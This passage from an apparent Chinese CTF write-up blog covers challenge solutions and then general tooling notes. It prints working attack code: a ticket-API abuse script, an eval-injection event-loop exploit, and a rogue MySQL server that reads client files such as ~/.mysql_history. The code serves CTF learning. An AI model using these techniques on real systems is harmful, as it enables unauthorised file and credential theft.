class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span>)</span><br><span class="line">        json1 = json.loads(html.text)</span><br><span class="line">        ticketid = json1[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"bill_id"</span>]</span><br><span class="line">        html1 = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span>+ticketid)</span><br><span class="line">        html2 = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span>)</span><br><span class="line">        json2 = json.loads(html2.text)</span><br><span class="line">        id = json2[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"id"</span>]</span><br><span class="line">        ticket = json2[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"ticket"</span>]</span><br><span class="line"></span><br><span class="line">        pack = &#123;<span class="string">"id"</span>:id , <span class="string">"ticket"</span>:ticket&#125;</span><br><span class="line">        <span class="keyword">return</span> pack</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_people</span><span class="params">(id,ticket)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=cic&amp;password=12345678"</span>)</span><br><span class="line">    html = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id="</span>+str(id)+<span class="string">"&amp;ticket="</span>+ticket)</span><br><span class="line">    print(html.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    reg()</span><br><span class="line">    <span class="comment">#get_ticket()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        pack = get_ticket(i)</span><br><span class="line">        id = pack[<span class="string">"id"</span>]</span><br><span class="line">        ticket = pack[<span class="string">"ticket"</span>]</span><br><span class="line">        print(id)</span><br><span class="line">        print(ticket)</span><br><span class="line">        del_people(id, ticket)</span><br><span class="line">        <span class="comment">#del_people(id,ticket)</span></span><br></pre></td></tr></table></figure>
<h2 id="滴">滴</h2>
<p>沙雕题目，要读取的文件<code>.practice.txt.swp</code>在线索网址的作者的另一篇博客中出现过，读取，获得源码，传递引用就可以了</p>
<h2 id="图片上传">图片上传</h2>
<p>上传一张图片，提示缺少字段<code>phpinfo()</code>,并显示出了上传后的图片，下载后放入<code>010editor</code>中比较发现文件被改动，比较发现特定位置上的字节并没有被改动，在该位置后面添加<code>phpinfo()</code>上传就有flag了。</p>
<h2 id="homebrew-event-loop">homebrew event loop</h2>
<p>read the source code first</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f66741e857'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># put event in a queue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the string between prefix and postfix</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># handle a event everytime</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># trigger_event%23;get_flag</span></span><br><span class="line">                <span class="comment"># 这个地方有意思，%23也就是井号是在拼接之后在eval的时候才触发的，而不是在拼接的时候立刻触发。而从下面来看，似乎井号的触发范围也封装在了event_handle里面了，而不会影响范围外的执行。</span></span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line">    </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/56887796-12dafb80-6aa5-11e9-9181-aae6b45ea0ca.png" alt="Screenshot from 2019-04-29 17-29-27"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/56887798-140c2880-6aa5-11e9-8fcf-44b7353af4da.png" alt="Screenshot from 2019-04-29 17-28-05"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/56887802-14a4bf00-6aa5-11e9-853d-48cdb2ae8df4.png" alt="Screenshot from 2019-04-29 17-28-36"></p>
<p>这里有个点有疑问：</p>
<ul>
<li>为什么<code>get_flag_handle</code>函数可以在没有参数的情况下运行？毕竟他申明的时候是有参数的。</li>
</ul>
<p>值得注意的是，<code>get_flag_handle</code> 和 <code>buy</code>函数是在<code>consume_point_function</code>执行之前被执行的，这个函数会检查我们是否有足够的钻石，如果没有就回滚。然而，整个流程是通过队列来控制的，这意味着如果我们将<code>buy</code>和<code>get_flag</code>函数插入在<code>consume_point_function</code>前面的话，他们会先执行并获取到<code>flag</code>， 注意到<code>trigger_event</code>会将flag放进<code>log</code>之中去并放在<code>session</code>中显示回来。</p>
<h2 id="mysql弱口令">mysql弱口令</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/57570602-6d297400-7436-11e9-9cfe-720761c4b08f.png" alt="QQ截图20190511214737"></p>
<p>客户端访问服务端时，服务端可以向客户端发送请求并且实现任意文件读取。</p>
<p>题目中的脚本目的是检测是否开启了mysql服务，所以可以将回显的东西设置为 <code>result = [{'local_address':&quot;0.0.0.0:3306&quot;,'Process_name':&quot;1234/mysqld&quot;}]</code>，这样就可以绕过客户端的验证了。</p>
<p>然后伪造一个mysql客户端。包括三部分：伪造greeting包，伪造登录成功包，伪造文件响应包。<br>
脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">'0.0.0.0'</span></span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">server.bind((host,port))</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># filename = '/etc/passwd'</span></span><br><span class="line">filename = <span class="string">'~/.mysql_history'</span></span><br><span class="line"></span><br><span class="line">greeting = <span class="string">"5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">login_conf = <span class="string">"0700000200000002000000"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的chr值得注意</span></span><br><span class="line">evil_request = chr(len(filename) + <span class="number">1</span>)+<span class="string">"\x00\x00\x01\xfb"</span>+filename</span><br><span class="line"></span><br><span class="line">conn, addr = server.accept()</span><br><span class="line">conn.send(greeting)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(login_conf)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(evil_request)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>
<p>三个发送的东西分别对应如下：</p>
<ul>
<li>greeting</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/57570552-ebd1e180-7435-11e9-9c95-fed585cdd3a2.png" alt="Screenshot from 2019-05-11 15-31-17"></p>
<ul>
<li>
<p>登录通过包</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57570520-7e25b580-7435-11e9-988e-f68b0f04317e.png" alt="Screenshot from 2019-05-11 15-35-00"></p>
</li>
<li>
<p>文件回显包</p>
</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/57570547-d8267b00-7435-11e9-9551-fb9ef384c7fd.png" alt="Screenshot from 2019-05-11 15-49-14"></p>
<p>同时运行经过修改后的<code>agent.py</code>和我们的脚本，同时在题目中填上我们的ip和mysql的端口号，就得到了flag</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57570617-9944f500-7436-11e9-93c5-11b65904cd31.png" alt="Screenshot from 2019-05-11 16-30-14"></p>
<p>参考 ：<br>
<a href="https://xz.aliyun.com/t/3277" target="_blank" rel="noopener">https://xz.aliyun.com/t/3277</a></p>
<p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a></p>
<p><a href="https://www.anquanke.com/post/id/106488" target="_blank" rel="noopener">https://www.anquanke.com/post/id/106488</a></p>
<h2 id="wireshark">wireshark</h2>
<p>拿到数据包，打开，设置过滤条件<code>http</code>，可以看到这里有图片流量。使用<code>file-&gt;export objects-&gt;http</code>来导出所有可以导出的东西，然后有两个通过16进制编辑器修改得出的图片和一张完整图片。其中，两张图片中有一张无法查看，另一张和完整的那张图片一模一样。或者也可以右击导出图中指定的图片部分数据。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57571087-2474b980-743c-11e9-976a-480a59136d09.png" alt="Screenshot from 2019-05-11 22-18-49"></p>
<p>在<code>wireshark</code>中追踪TCP流，发现最开始访问了一个图片加密的网站。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57571086-23dc2300-743c-11e9-90fc-a068dc33cbfa.png" alt="Screenshot from 2019-05-11 22-22-25"></p>
<p>进入，看起来图片的解密是需要密钥的，那么另一张无法查看的图片可能有我们想要的密钥。修改高宽之后可以查看密钥。进入解密网站解密，并用16进制解密即可。</p>
<img width="799" alt="upload_repaire" src="https://user-images.githubusercontent.com/40637063/57571120-73225380-743c-11e9-8178-e1f74c83a67a.png">
<p><img src="https://user-images.githubusercontent.com/40637063/57571078-f1322a80-743b-11e9-8ebe-099e2db550f7.png" alt="Screenshot from 2019-05-11 15-24-45"></p>
]]></content>
  </entry>
  <entry>
    <title>零碎知识[working]</title>
    <url>/2019/08/28/%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h3 id="vscode">vscode</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">显示函数列表 ctrl shift o</span><br><span class="line">前进后退 alt 左右</span><br></pre></td></tr></table></figure>
<h3 id="linux-Xdebug">linux Xdebug</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install php-pear # contains pecl</span><br><span class="line">apt install php-dev # contains phpsize which is need to run</span><br><span class="line">pecl install xdebug</span><br><span class="line"></span><br><span class="line">/etc/php/7.3/apache2/php.ini</span><br><span class="line"></span><br><span class="line">[xdebug]</span><br><span class="line">zend_extension=/usr/lib/php/20180731/xdebug.so</span><br><span class="line">xdebug.remote_enable = true</span><br><span class="line">xdebug.remote_autostart = true</span><br><span class="line">xdebug.remote_host = 192.168.75.1</span><br><span class="line">xdebug.remote_port = 9000</span><br><span class="line">xdebug.remote_log = /var/log/xdebug.log</span><br><span class="line">xdebug.max_nesting_level = 1000</span><br><span class="line"></span><br><span class="line">service apache2 restart</span><br><span class="line"></span><br><span class="line"># check phpinfo whether there is xdebug</span><br></pre></td></tr></table></figure>
<p>client-vscode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctrl alt p   launch.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Listen for XDebug&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;pathMappings&quot;: &#123;</span><br><span class="line">                &quot;/var/www/html/cms/tp6x&quot;: &quot;C:\\Users\\ch4ser__\\Desktop\\vscode_workspace\\tp6x&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;port&quot;: 9000,</span><br><span class="line">            &quot;log&quot;: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch currently open script&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,</span><br><span class="line">            &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;port&quot;: 9000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="git">git</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log flag.php #查看文件的历史版本</span><br><span class="line">git diff &#123;版本号&#125; #查看历史版本号的内容和现在内容的不同</span><br><span class="line">git reset --hard &#123;commit&#125;</span><br></pre></td></tr></table></figure>
<h3 id="find">find</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -user downfall 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<h3 id="mariadb-踩坑">mariadb 踩坑</h3>
<p>运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -uroot</span><br><span class="line">use mysql;</span><br><span class="line">select * from user where user=&apos;root&apos;;</span><br></pre></td></tr></table></figure>
<p>就会发现root的plugin是unix_socket,关于这个插件的解释在这里</p>
<p><a href="https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/" target="_blank" rel="noopener">https://mariadb.com/kb/en/library/authentication-plugin-unix-socket/</a></p>
<p>直观的效果是:当在终端中mysql -uroot -hlocalhost的时候可以登录,而且无需验证密码.但是php在以root身份连接数据库的时候只会遭到拒绝.</p>
<p>解决方法:创建一个新的用户,或者修改已有用户的登录机制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE USER &apos;newuser&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password&apos;;</span><br><span class="line">ALTER USER newuser@localhost IDENTIFIED VIA mysql_native_password;</span><br><span class="line">GRANT ALL PRIVILEGES ON * . * TO &apos;newuser&apos;@&apos;localhost&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="apache2-服务出现问题">apache2 服务出现问题</h2>
<p>粗暴一些</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt purge apache2</span><br><span class="line">apt reinstall apache2</span><br></pre></td></tr></table></figure>
<h3 id="htaccess-实验">.htaccess 实验</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a2enmod</span><br><span class="line">vim /etc/apache2/site-enabled/000-default.conf</span><br><span class="line">	&lt;Directory /var/www/&gt;</span><br><span class="line">		Options -Indexes</span><br><span class="line">		AllowOverride All</span><br><span class="line">	&lt;/Directory&gt;</span><br><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>
<h3 id="curl">curl</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --local-port &#123;PORT&#125; &#123;url&#125; #从本地的指定端口去访问url</span><br><span class="line">curl -d "user=admin&amp;password=111" http://207.148.64.125:1111 #post数据</span><br><span class="line">curl -H "Content-Type:application/json" -X POST -d '&#123;"user": "admin", "passwd":"12345678"&#125;' http://127.0.0.1:8000/login</span><br></pre></td></tr></table></figure>
<h3 id="docker">docker</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span> this will create a container</span><br><span class="line">sudo docker run -it kalilinux/kali-linux-docker /bin/bash</span><br><span class="line"><span class="meta">#</span> after exit it ,run container again</span><br><span class="line"><span class="meta">#</span> find out all the container</span><br><span class="line"><span class="meta">#</span> -al will only show the active container</span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker container start &#123;container id&#125;</span><br><span class="line"></span><br><span class="line">docker ps</span><br><span class="line">sudo docker exec -it &#123;container id&#125; /bin/bash</span><br><span class="line"></span><br><span class="line">docker build -t ssrf-lab/basic . #构建镜像</span><br><span class="line">docker run -d -p 8999:80 ssrf-lab/basic #创建容器</span><br><span class="line">docker stop [容器编号] #关闭容器</span><br><span class="line"></span><br><span class="line">docker attach bianhao # 进入容器</span><br></pre></td></tr></table></figure>
<h3 id="python-执行js代码">python 执行js代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line">jsFunc = <span class="string">'''</span></span><br><span class="line"><span class="string">function sign (data, key) &#123;</span></span><br><span class="line"><span class="string">    var privateKey</span></span><br><span class="line"><span class="string">    var i, j</span></span><br><span class="line"><span class="string">    var W = new Array(80)</span></span><br><span class="line"><span class="string">    var A, B, C, D, E</span></span><br><span class="line"><span class="string">    var H0 = 0x97B5D3F1</span></span><br><span class="line"><span class="string">    var H1 = 0x1F3D5B79</span></span><br><span class="line"><span class="string">    var H2 = 0x684A2C0E</span></span><br><span class="line"><span class="string">    var H3 = 0xE0C2A486</span></span><br><span class="line"><span class="string">    var H4 = 0x33221100</span></span><br><span class="line"><span class="string">    var H5 = 0xF0F0F0F0</span></span><br><span class="line"><span class="string">    var temp</span></span><br><span class="line"><span class="string">    var _RSA = function (n, s) &#123;</span></span><br><span class="line"><span class="string">        var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))</span></span><br><span class="line"><span class="string">        return t4</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    var _Rot = function (val) &#123;</span></span><br><span class="line"><span class="string">        var str = ''</span></span><br><span class="line"><span class="string">        var i</span></span><br><span class="line"><span class="string">        var v</span></span><br><span class="line"><span class="string">        for (i = 7; i &gt;= 0; i--) &#123;</span></span><br><span class="line"><span class="string">            v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f</span></span><br><span class="line"><span class="string">            str += v.toString(16)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return str</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    str = 